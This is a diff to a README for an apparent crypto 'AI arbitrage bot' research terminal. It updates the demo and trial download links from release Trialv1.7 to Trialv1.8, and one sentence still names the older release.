@@ -10,7 +10,7 @@ A live, interactive research terminal for **ETH / BTC / BNB**.
 
 <!-- pages-links:start -->
 [![VIEW DEMO](docs/view-demo.svg)](https://wordystepuncl.github.io/arbitrage/)
-[![DOWNLOAD](docs/download-project.svg)](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trialv1.7/Trialv1.7.zip)
+[![DOWNLOAD](docs/download-project.svg)](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trialv1.8/Trialv1.8.zip)
 
 [Live demo](https://wordystepuncl.github.io/arbitrage/) · [Run locally](#run-locally)
 <!-- pages-links:end -->
@@ -127,4 +127,4 @@ No analytics, cookies, wallet access or trading credentials. Session history rem
 
 ## Download the trial
 
-The **DOWNLOAD** button and the in-demo **Download trial** button link to [Trialv1.7.zip](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trialv1.7/Trialv1.7.zip) from the **Trialv1.7** GitHub release.
+The **DOWNLOAD** button and the in-demo **Download trial** button link to [Trialv1.8.zip](https://github.com/wordystepuncl/ai-arbitrage-bot/releases/download/Trialv1.8/Trialv1.8.zip) from the **Trialv1.7** GitHub release.
